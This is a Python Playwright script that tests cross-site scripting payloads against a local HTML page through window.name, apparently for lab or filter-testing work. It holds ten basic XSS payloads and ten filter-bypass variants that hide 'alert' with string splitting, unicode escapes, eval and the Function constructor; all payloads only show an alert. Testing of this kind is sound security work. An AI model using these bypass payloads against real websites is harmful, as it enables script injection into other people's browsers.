import asyncio
from playwright.async_api import async_playwright

payloads = [
    "<img src=x onerror=alert('XSS')>",
    "<style><style /><img src=x onerror=alert('XSS')>",
    '<img alt="<x" title="/><img src=x onerror=alert(\'XSS\')>">',
    "<option><style></option></select><img src=x onerror=alert('XSS')></style>",
    "<svg/onload=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<input autofocus onfocus=alert('XSS')>",
    '<iframe src="javascript:alert(`XSS`)"></iframe>',
    "<math><mi//xlink:href='data:x,alert(1)'></math>",
    "<select><option></option></select><img src=x onerror=alert('XSS')>"
]

bypass_payloads = [
    "<svg/onload=setTimeout('ale'+'rt(1)',100)>",
    "<iframe src=\"javascript: setTimeout('ale'+'rt(1)', 100)\"></iframe>",
    "<details open ontoggle=\"setTimeout(unescape('%61%6c%65%72%74(1)'), 100)\">",
    "<input onfocus=(()=>{setTimeout(()=>{alert?.(1)},100)})() autofocus>",
    "<img src=x onerror=((x)=>{['al','ert'][0]+='';eval(x)})(`alert(1)`)>",
    "<select><option></option></select><img src=x onerror=[].filter.constructor('ale'+'rt(1)')()>",
    "<math><mtext><script>setInterval`alert\\u00281\\u0029`</script></mtext></math>",
    "<video><source onerror=Function(\"alert(1)\")()>",
    "<marquee onstart=eval`al\\u0065rt(1)`>",
    "<script>new Function`aler\\u0074(1)`()</script>"
]


async def test_payload(playwright, file_path: str, payload: str) -> bool:
    browser = await playwright.chromium.launch(headless=True)
    context = await browser.new_context()

    async def on_dialog(dialog):
        await dialog.dismiss()
        context.alert_triggered = True

    page = await context.new_page()
    context.alert_triggered = False
    page.on("dialog", on_dialog)

    # 載入 HTML，設 window.name，再重載頁面觸發
    await page.goto(file_path, wait_until="load")
    await page.evaluate(f'window.name = `{payload}`')
    await page.reload()
    await asyncio.sleep(1)

    await browser.close()
    return context.alert_triggered

async def main():
    html_path = "http://127.0.0.1:5500/test/test.html"  # ← 請改成實際路徑

    async with async_playwright() as playwright:
        print("=== 開始測試 Payloads ===")
        for i, payload in enumerate(bypass_payloads):
            try:
                result = await test_payload(playwright, html_path, payload)
                # status = "Triggered" if result else "Not Triggered"
                # print(f"[{i+1}] {status} | {payload}")
                if result:
                    print(f"[{i}] Triggered | {payload}")
            except Exception as e:
                print(f"[{i}] Error! | Payload: {payload}")

if __name__ == "__main__":
    asyncio.run(main())
